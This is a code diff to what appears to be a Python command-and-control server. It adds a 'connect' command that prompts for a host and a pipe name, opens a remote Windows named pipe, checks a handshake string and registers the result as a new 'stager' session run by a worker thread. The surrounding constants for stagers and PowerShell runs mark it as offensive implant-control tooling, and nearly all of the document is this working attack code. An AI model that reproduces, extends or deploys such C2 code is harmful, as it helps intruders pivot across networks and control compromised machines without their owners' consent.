@@ -80,7 +80,8 @@ class myconstant():
         self.CMD_PIPE_STAGER_GET_RUNNING_LIST = "rlist"
         self.CMD_PIPE_STAGER_GET_INTO = "into"
         self.CMD_PIPE_STAGER_GET_HISTORY = "history"
-        self.CMD_PIPE_SAGER_AUTOLIST = [self.CMD_PIPE_STAGER_GET_LIST,self.CMD_PIPE_STAGER_GET_INTO,self.CMD_PIPE_STAGER_GET_HISTORY,self.CMD_BACK,self.CMD_PIPE_STAGER_GET_RUNNING_LIST]
+        self.CMD_PIPE_STAGER_CON = "connect"
+        self.CMD_PIPE_SAGER_AUTOLIST = [self.CMD_PIPE_STAGER_GET_LIST,self.CMD_PIPE_STAGER_GET_INTO,self.CMD_PIPE_STAGER_GET_HISTORY,self.CMD_BACK,self.CMD_PIPE_STAGER_GET_RUNNING_LIST,self.CMD_PIPE_STAGER_CON]
         #self.CMD_PIPE_STAGER_LOAD_PS = "psload"
         #self.CMD_PIPE_STAGER_CON = "connect" 
 
@@ -88,6 +89,7 @@ class myconstant():
 class myconstant_networking(): #applicaiton layer tag
     def __init__(self):
         self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
+        self.PIPE_CONNECTED = "PIPE_CONNECTED"
 
 
 class mybuildin_cmd():
@@ -366,6 +368,43 @@ class myserver():
         self.__mystart_list[myuuid] = True
         print("[Client] myuuid is {}".format(myuuid))
         threading.Thread(target=self.start_worker,args=(myuuid,)).start()
+
+    def start_pipe_client(self,conhost,pipename):
+        t_net_constant = myconstant_networking()
+        print("Trying to connect to {}".format(r'\\'+ conhost + r'\pipe\\' + pipename))
+
+        try:
+            handle = win32file.CreateFile(r'\\'+ conhost + r'\pipe\\' + pipename, win32file.GENERIC_READ | win32file.GENERIC_WRITE, 0, None, win32file.OPEN_EXISTING, 0, None)
+            win32pipe.SetNamedPipeHandleState(handle, win32pipe.PIPE_READMODE_MESSAGE, None, None)
+            resp = win32file.ReadFile(handle, 1024)
+        except Exception as e:
+            print("Error connecting to client: {}...".format(str(e)))
+            return
+        
+        if resp[1].decode("ascii", "ignore") == t_net_constant.PIPE_CONNECTED:
+            print("[Client] Connected to", conhost)
+            
+            #have everything normally 
+            myuuid = uuid.uuid4().hex[:6].upper() #stager
+            #create fifo
+            self.__mypipe_mydata_list[myuuid] = queue.Queue()
+            #create history
+            self.__mypipe_mymsg_list[myuuid] = list()
+            #push uuid
+            self.__mypipe_myuuid_list.append(myuuid)
+            #set start
+            self.__mypipe_mystart_list[myuuid] = True
+            #pipe name
+            self.__mypipe_mypipename_list[myuuid] = pipename
+            #push pipe handle
+            self.__mypipe_myhandle_list[myuuid] = handle
+            
+            print("[Client] myuuid is {}".format(myuuid))
+            threading.Thread(target=self.start_pipworker,args=(myuuid,)).start()
+        else:
+            print("ACK failed ...")
+
+
 
 
     def start_listener(self):
@@ -835,6 +874,14 @@ class mymainclass():
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_RUNNING_LIST:
                     self.__t_myserver.print_pipe_stager_running()
                     continue
+
+                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_CON:
+                    #unset auto complete
+                    removecomplete()
+                    #get host and port
+                    user_input_host = input("Please enter hostname or ip: ")
+                    user_input_pipename = input("Please enter pipename: ")
+                    self.__t_myserver.start_pipe_client(user_input_host,user_input_pipename)
 
 
 
